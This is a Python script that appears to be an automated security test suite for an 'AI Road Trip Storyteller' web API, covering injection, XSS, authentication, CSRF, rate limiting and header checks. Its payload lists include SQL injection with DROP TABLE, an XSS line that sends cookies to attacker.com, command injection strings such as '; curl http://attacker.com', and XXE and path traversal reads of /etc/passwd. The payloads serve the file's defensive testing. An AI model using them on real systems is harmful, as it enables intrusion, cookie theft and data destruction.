#!/usr/bin/env python3
"""
Automated Security Testing Suite for AI Road Trip Storyteller
Comprehensive security tests covering OWASP Top 10 and more
"""

import requests
import json
import time
import random
import string
import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple
from datetime import datetime
import urllib.parse
from colorama import init, Fore, Style
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Initialize colorama for colored output
init(autoreset=True)

class SecurityTester:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        self.test_user_email = f"security_test_{random.randint(1000, 9999)}@test.com"
        self.test_password = "Test@Password123!"
        self.auth_token = None
        self.csrf_token = None
        
    def print_banner(self):
        """Print security test banner"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}AI Road Trip Security Testing Suite")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.CYAN}{'='*60}\n")
        
    def print_test_header(self, test_name: str):
        """Print test section header"""
        print(f"\n{Fore.YELLOW}[*] {test_name}")
        print(f"{Fore.YELLOW}{'-'*40}")
        
    def print_result(self, test_name: str, passed: bool, details: str = ""):
        """Print test result"""
        if passed:
            print(f"{Fore.GREEN}[✓] {test_name}: PASSED")
        else:
            print(f"{Fore.RED}[✗] {test_name}: FAILED")
        if details:
            print(f"    {details}")
            
        self.results.append({
            "test": test_name,
            "passed": passed,
            "details": details,
            "timestamp": datetime.now().isoformat()
        })
        
    def setup_test_user(self):
        """Create a test user for authenticated tests"""
        self.print_test_header("Setting up test user")
        
        try:
            # Register user
            response = self.session.post(
                f"{self.base_url}/api/auth/register",
                json={
                    "email": self.test_user_email,
                    "password": self.test_password,
                    "full_name": "Security Tester"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                self.auth_token = data.get("access_token")
                self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
                self.print_result("Test user creation", True)
                return True
            else:
                # Try to login if user already exists
                return self.login_test_user()
                
        except Exception as e:
            self.print_result("Test user creation", False, str(e))
            return False
            
    def login_test_user(self):
        """Login with test user"""
        try:
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                data={
                    "username": self.test_user_email,
                    "password": self.test_password
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                self.auth_token = data.get("access_token")
                self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
                return True
                
        except Exception:
            pass
            
        return False
        
    # 1. SQL Injection Tests
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        self.print_test_header("SQL Injection Tests")
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' AND '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "' OR username LIKE '%",
            "' UNION ALL SELECT NULL,NULL,NULL--"
        ]
        
        vulnerable_endpoints = []
        
        # Test login endpoint
        for payload in sql_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    data={
                        "username": payload,
                        "password": "password"
                    }
                )
                
                # Check for SQL errors in response
                if response.status_code == 500 or "sql" in response.text.lower():
                    vulnerable_endpoints.append(f"Login endpoint with payload: {payload}")
                    
            except Exception:
                pass
                
        # Test search endpoints
        search_endpoints = [
            "/api/stories/search",
            "/api/users/search",
            "/api/experiences/search"
        ]
        
        for endpoint in search_endpoints:
            for payload in sql_payloads[:3]:  # Test first 3 payloads
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={"q": payload}
                    )
                    
                    if response.status_code == 500 or "sql" in response.text.lower():
                        vulnerable_endpoints.append(f"{endpoint} with payload: {payload}")
                        
                except Exception:
                    pass
                    
        self.print_result(
            "SQL Injection Protection",
            len(vulnerable_endpoints) == 0,
            f"Found {len(vulnerable_endpoints)} potential vulnerabilities" if vulnerable_endpoints else "All endpoints properly protected"
        )
        
    # 2. XSS Tests
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        self.print_test_header("XSS (Cross-Site Scripting) Tests")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.location='http://attacker.com'</script>",
            "<img src=\"x\" onerror=\"this.src='http://attacker.com?c='+document.cookie\">",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        vulnerable_endpoints = []
        
        # Test story creation
        if self.auth_token:
            for payload in xss_payloads[:5]:  # Test first 5 payloads
                try:
                    response = self.session.post(
                        f"{self.base_url}/api/stories",
                        json={
                            "title": payload,
                            "content": f"Test content with {payload}",
                            "description": payload
                        }
                    )
                    
                    if response.status_code == 200:
                        # Check if payload is returned unescaped
                        data = response.json()
                        if payload in str(data):
                            vulnerable_endpoints.append(f"Story creation with payload: {payload}")
                            
                except Exception:
                    pass
                    
        # Test user profile update
        for payload in xss_payloads[:3]:
            try:
                response = self.session.patch(
                    f"{self.base_url}/api/users/me",
                    json={
                        "full_name": payload,
                        "bio": payload
                    }
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if payload in str(data):
                        vulnerable_endpoints.append(f"Profile update with payload: {payload}")
                        
            except Exception:
                pass
                
        self.print_result(
            "XSS Protection",
            len(vulnerable_endpoints) == 0,
            f"Found {len(vulnerable_endpoints)} potential XSS vulnerabilities" if vulnerable_endpoints else "All user inputs properly escaped"
        )
        
    # 3. Authentication Bypass Tests
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        self.print_test_header("Authentication Bypass Tests")
        
        vulnerabilities = []
        
        # Test accessing protected endpoints without auth
        protected_endpoints = [
            "/api/users/me",
            "/api/stories/my-stories",
            "/api/reservations",
            "/api/admin/users",
            "/api/preferences"
        ]
        
        # Remove auth header temporarily
        auth_header = self.session.headers.get("Authorization")
        self.session.headers.pop("Authorization", None)
        
        for endpoint in protected_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if response.status_code == 200:
                    vulnerabilities.append(f"{endpoint} accessible without authentication")
                    
            except Exception:
                pass
                
        # Test with invalid tokens
        invalid_tokens = [
            "Bearer invalid_token",
            "Bearer " + "a" * 200,
            "Bearer null",
            "Bearer undefined",
            "Bearer ",
            "Invalid Header"
        ]
        
        for token in invalid_tokens:
            self.session.headers["Authorization"] = token
            try:
                response = self.session.get(f"{self.base_url}/api/users/me")
                
                if response.status_code == 200:
                    vulnerabilities.append(f"Endpoint accessible with invalid token: {token}")
                    
            except Exception:
                pass
                
        # Restore auth header
        if auth_header:
            self.session.headers["Authorization"] = auth_header
            
        self.print_result(
            "Authentication Bypass Protection",
            len(vulnerabilities) == 0,
            f"Found {len(vulnerabilities)} authentication bypasses" if vulnerabilities else "All endpoints properly protected"
        )
        
    # 4. Privilege Escalation Tests
    def test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        self.print_test_header("Privilege Escalation Tests")
        
        vulnerabilities = []
        
        if not self.auth_token:
            self.print_result("Privilege Escalation Tests", False, "No auth token available")
            return
            
        # Try to access admin endpoints
        admin_endpoints = [
            ("/api/admin/users", "GET"),
            ("/api/admin/analytics", "GET"),
            ("/api/admin/config", "GET"),
            ("/api/admin/users/1/role", "PATCH")
        ]
        
        for endpoint, method in admin_endpoints:
            try:
                if method == "GET":
                    response = self.session.get(f"{self.base_url}{endpoint}")
                elif method == "PATCH":
                    response = self.session.patch(
                        f"{self.base_url}{endpoint}",
                        json={"role": "admin"}
                    )
                    
                if response.status_code == 200:
                    vulnerabilities.append(f"Admin endpoint {endpoint} accessible to regular user")
                    
            except Exception:
                pass
                
        # Try to modify other users' data
        try:
            response = self.session.patch(
                f"{self.base_url}/api/users/1",  # Try to modify user ID 1
                json={"full_name": "Hacked"}
            )
            
            if response.status_code == 200:
                vulnerabilities.append("Can modify other users' data")
                
        except Exception:
            pass
            
        self.print_result(
            "Privilege Escalation Protection",
            len(vulnerabilities) == 0,
            f"Found {len(vulnerabilities)} privilege escalation issues" if vulnerabilities else "Proper authorization checks in place"
        )
        
    # 5. CSRF Tests
    def test_csrf_protection(self):
        """Test CSRF protection mechanisms"""
        self.print_test_header("CSRF (Cross-Site Request Forgery) Tests")
        
        vulnerabilities = []
        
        if not self.auth_token:
            self.print_result("CSRF Tests", False, "No auth token available")
            return
            
        # Test state-changing operations without CSRF token
        endpoints = [
            ("/api/stories", "POST", {"title": "CSRF Test", "content": "Test"}),
            ("/api/users/me", "PATCH", {"full_name": "CSRF Test"}),
            ("/api/reservations", "POST", {"venue": "test", "date": "2024-12-25"})
        ]
        
        # Remove CSRF header if present
        csrf_header = self.session.headers.get("X-CSRF-Token")
        self.session.headers.pop("X-CSRF-Token", None)
        
        for endpoint, method, data in endpoints:
            try:
                if method == "POST":
                    response = self.session.post(f"{self.base_url}{endpoint}", json=data)
                elif method == "PATCH":
                    response = self.session.patch(f"{self.base_url}{endpoint}", json=data)
                    
                # If request succeeds without CSRF token, it's vulnerable
                if response.status_code in [200, 201]:
                    vulnerabilities.append(f"{method} {endpoint} lacks CSRF protection")
                    
            except Exception:
                pass
                
        # Restore CSRF header
        if csrf_header:
            self.session.headers["X-CSRF-Token"] = csrf_header
            
        self.print_result(
            "CSRF Protection",
            len(vulnerabilities) == 0,
            f"Found {len(vulnerabilities)} endpoints without CSRF protection" if vulnerabilities else "CSRF protection properly implemented"
        )
        
    # 6. Rate Limiting Tests
    async def test_rate_limiting_async(self):
        """Test rate limiting implementation"""
        self.print_test_header("Rate Limiting Tests")
        
        endpoints_to_test = [
            "/api/auth/login",
            "/api/stories/generate",
            "/api/voice-assistant/interact",
            "/api/ai/chat"
        ]
        
        rate_limit_issues = []
        
        async with aiohttp.ClientSession() as session:
            for endpoint in endpoints_to_test:
                # Send many requests rapidly
                requests_sent = 0
                successful_requests = 0
                
                tasks = []
                for i in range(100):  # Send 100 requests
                    if endpoint == "/api/auth/login":
                        task = session.post(
                            f"{self.base_url}{endpoint}",
                            json={"username": "test@test.com", "password": "wrong"}
                        )
                    else:
                        headers = {}
                        if self.auth_token:
                            headers["Authorization"] = f"Bearer {self.auth_token}"
                        task = session.get(f"{self.base_url}{endpoint}", headers=headers)
                        
                    tasks.append(task)
                    
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                for response in responses:
                    if not isinstance(response, Exception):
                        requests_sent += 1
                        if response.status == 200:
                            successful_requests += 1
                            
                # Check if rate limiting kicked in
                if successful_requests == requests_sent:
                    rate_limit_issues.append(f"{endpoint}: No rate limiting detected")
                    
        self.print_result(
            "Rate Limiting",
            len(rate_limit_issues) == 0,
            f"Found {len(rate_limit_issues)} endpoints without rate limiting" if rate_limit_issues else "Rate limiting properly implemented"
        )
        
    def test_rate_limiting(self):
        """Wrapper for async rate limiting test"""
        asyncio.run(self.test_rate_limiting_async())
        
    # 7. API Key Security Tests
    def test_api_key_security(self):
        """Test API key security and exposure"""
        self.print_test_header("API Key Security Tests")
        
        issues = []
        
        # Check for API keys in responses
        endpoints = [
            "/api/config",
            "/api/settings",
            "/api/info",
            "/api/health",
            "/api/status"
        ]
        
        api_key_patterns = [
            "api_key",
            "apikey",
            "api-key",
            "secret",
            "token",
            "key",
            "GOOGLE_MAPS_API_KEY",
            "OPENAI_API_KEY",
            "TICKETMASTER_API_KEY"
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    for pattern in api_key_patterns:
                        if pattern.lower() in response_text:
                            # Check if it contains actual key values
                            try:
                                data = response.json()
                                if self._contains_api_key(data):
                                    issues.append(f"{endpoint} exposes API keys")
                                    break
                            except:
                                pass
                                
            except Exception:
                pass
                
        # Check error messages for key exposure
        try:
            response = self.session.get(f"{self.base_url}/api/invalid-endpoint-12345")
            if "api_key" in response.text.lower() or "secret" in response.text.lower():
                issues.append("Error messages may expose sensitive information")
        except:
            pass
            
        self.print_result(
            "API Key Security",
            len(issues) == 0,
            f"Found {len(issues)} API key security issues" if issues else "API keys properly protected"
        )
        
    def _contains_api_key(self, data: dict, depth: int = 0) -> bool:
        """Recursively check if dictionary contains API key patterns"""
        if depth > 5:  # Prevent infinite recursion
            return False
            
        for key, value in data.items():
            if isinstance(value, str) and len(value) > 20 and not value.startswith("test"):
                # Looks like an actual API key
                if any(pattern in key.lower() for pattern in ["key", "secret", "token"]):
                    return True
            elif isinstance(value, dict):
                if self._contains_api_key(value, depth + 1):
                    return True
                    
        return False
        
    # 8. Input Validation Tests
    def test_input_validation(self):
        """Test input validation for various attack vectors"""
        self.print_test_header("Input Validation Tests")
        
        issues = []
        
        # Test for command injection
        command_payloads = [
            "; ls -la",
            "| whoami",
            "$(cat /etc/passwd)",
            "`id`",
            "; curl http://attacker.com",
            "& ping -c 10 127.0.0.1"
        ]
        
        # Test file upload endpoints
        if self.auth_token:
            for payload in command_payloads[:3]:
                try:
                    response = self.session.post(
                        f"{self.base_url}/api/upload",
                        files={"file": (payload, "test content", "text/plain")}
                    )
                    
                    if response.status_code == 500:
                        issues.append(f"Potential command injection in file upload: {payload}")
                        
                except Exception:
                    pass
                    
        # Test for XXE (XML External Entity) injection
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>"""
        
        try:
            response = self.session.post(
                f"{self.base_url}/api/import",
                data=xxe_payload,
                headers={"Content-Type": "application/xml"}
            )
            
            if "root:" in response.text:
                issues.append("XXE vulnerability detected")
                
        except Exception:
            pass
            
        # Test for path traversal
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_payloads:
            try:
                response = self.session.get(f"{self.base_url}/api/files/{payload}")
                
                if response.status_code == 200 and ("root:" in response.text or "[fonts]" in response.text):
                    issues.append(f"Path traversal vulnerability with: {payload}")
                    
            except Exception:
                pass
                
        self.print_result(
            "Input Validation",
            len(issues) == 0,
            f"Found {len(issues)} input validation issues" if issues else "Proper input validation in place"
        )
        
    # 9. Session Security Tests
    def test_session_security(self):
        """Test session management security"""
        self.print_test_header("Session Security Tests")
        
        issues = []
        
        if not self.auth_token:
            self.print_result("Session Security Tests", False, "No auth token available")
            return
            
        # Check token entropy
        if len(self.auth_token) < 100:
            issues.append("Token length may be insufficient")
            
        # Test session fixation
        old_token = self.auth_token
        
        try:
            # Login again
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                data={
                    "username": self.test_user_email,
                    "password": self.test_password
                }
            )
            
            if response.status_code == 200:
                new_token = response.json().get("access_token")
                
                if new_token == old_token:
                    issues.append("Session fixation: Token doesn't change on re-login")
                    
                # Test if old token still works
                self.session.headers["Authorization"] = f"Bearer {old_token}"
                response = self.session.get(f"{self.base_url}/api/users/me")
                
                if response.status_code == 200:
                    issues.append("Old tokens remain valid after re-login")
                    
                # Restore new token
                self.session.headers["Authorization"] = f"Bearer {new_token}"
                self.auth_token = new_token
                
        except Exception:
            pass
            
        # Test concurrent sessions
        # This would require multiple login attempts and checking if all tokens work
        
        self.print_result(
            "Session Security",
            len(issues) == 0,
            f"Found {len(issues)} session security issues" if issues else "Secure session management"
        )
        
    # 10. Security Headers Tests
    def test_security_headers(self):
        """Test for security headers"""
        self.print_test_header("Security Headers Tests")
        
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=",
            "Content-Security-Policy": True,  # Just check presence
            "Referrer-Policy": ["no-referrer", "strict-origin-when-cross-origin"]
        }
        
        missing_headers = []
        
        try:
            response = self.session.get(f"{self.base_url}/api/health")
            
            for header, expected_value in required_headers.items():
                actual_value = response.headers.get(header)
                
                if not actual_value:
                    missing_headers.append(header)
                elif isinstance(expected_value, list):
                    if not any(val in actual_value for val in expected_value):
                        missing_headers.append(f"{header} (incorrect value: {actual_value})")
                elif isinstance(expected_value, str):
                    if expected_value not in actual_value:
                        missing_headers.append(f"{header} (incorrect value: {actual_value})")
                        
        except Exception as e:
            self.print_result("Security Headers", False, str(e))
            return
            
        self.print_result(
            "Security Headers",
            len(missing_headers) == 0,
            f"Missing headers: {', '.join(missing_headers)}" if missing_headers else "All security headers present"
        )
        
    # 11. Information Disclosure Tests
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.print_test_header("Information Disclosure Tests")
        
        issues = []
        
        # Check for stack traces in errors
        try:
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"invalid": "data"}
            )
            
            if "Traceback" in response.text or "stack" in response.text.lower():
                issues.append("Stack traces exposed in error responses")
                
        except Exception:
            pass
            
        # Check for version disclosure
        endpoints = ["/", "/api", "/api/version", "/api/info"]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                # Check for version numbers in response
                if any(ver in response.text.lower() for ver in ["version", "v1.", "v2.", "fastapi", "python"]):
                    if any(char.isdigit() for char in response.text):
                        issues.append(f"{endpoint} may disclose version information")
                        
            except Exception:
                pass
                
        # Check for debug mode
        try:
            response = self.session.get(f"{self.base_url}/docs")
            if response.status_code == 200:
                issues.append("API documentation publicly accessible (/docs)")
                
            response = self.session.get(f"{self.base_url}/redoc")
            if response.status_code == 200:
                issues.append("API documentation publicly accessible (/redoc)")
                
        except Exception:
            pass
            
        self.print_result(
            "Information Disclosure",
            len(issues) == 0,
            f"Found {len(issues)} information disclosure issues" if issues else "No sensitive information disclosed"
        )
        
    def print_summary(self):
        """Print test summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Security Test Summary")
        print(f"{Fore.CYAN}{'='*60}")
        
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r["passed"])
        failed_tests = total_tests - passed_tests
        
        print(f"\nTotal Tests: {total_tests}")
        print(f"{Fore.GREEN}Passed: {passed_tests}")
        print(f"{Fore.RED}Failed: {failed_tests}")
        
        if failed_tests > 0:
            print(f"\n{Fore.RED}Failed Tests:")
            for result in self.results:
                if not result["passed"]:
                    print(f"  - {result['test']}: {result['details']}")
                    
        # Calculate security score
        score = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        print(f"\n{Fore.CYAN}Security Score: {score:.1f}%")
        
        # Save results to file
        with open("security_test_results.json", "w") as f:
            json.dump({
                "summary": {
                    "total_tests": total_tests,
                    "passed": passed_tests,
                    "failed": failed_tests,
                    "score": score,
                    "timestamp": datetime.now().isoformat()
                },
                "results": self.results
            }, f, indent=2)
            
        print(f"\nResults saved to: security_test_results.json")
        
    def run_all_tests(self):
        """Run all security tests"""
        self.print_banner()
        
        # Setup
        if not self.setup_test_user():
            print(f"{Fore.RED}Failed to setup test user. Some tests may fail.")
            
        # Run tests
        self.test_sql_injection()
        self.test_xss_vulnerabilities()
        self.test_authentication_bypass()
        self.test_privilege_escalation()
        self.test_csrf_protection()
        self.test_rate_limiting()
        self.test_api_key_security()
        self.test_input_validation()
        self.test_session_security()
        self.test_security_headers()
        self.test_information_disclosure()
        
        # Summary
        self.print_summary()


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Security Testing Suite for AI Road Trip")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL to test")
    parser.add_argument("--test", help="Run specific test only")
    
    args = parser.parse_args()
    
    tester = SecurityTester(args.url)
    
    if args.test:
        # Run specific test
        test_method = getattr(tester, f"test_{args.test}", None)
        if test_method:
            tester.print_banner()
            if args.test != "rate_limiting":
                tester.setup_test_user()
            test_method()
        else:
            print(f"{Fore.RED}Unknown test: {args.test}")
            print("Available tests: sql_injection, xss_vulnerabilities, authentication_bypass, ")
            print("privilege_escalation, csrf_protection, rate_limiting, api_key_security, ")
            print("input_validation, session_security, security_headers, information_disclosure")
    else:
        # Run all tests
        tester.run_all_tests()


if __name__ == "__main__":
    main()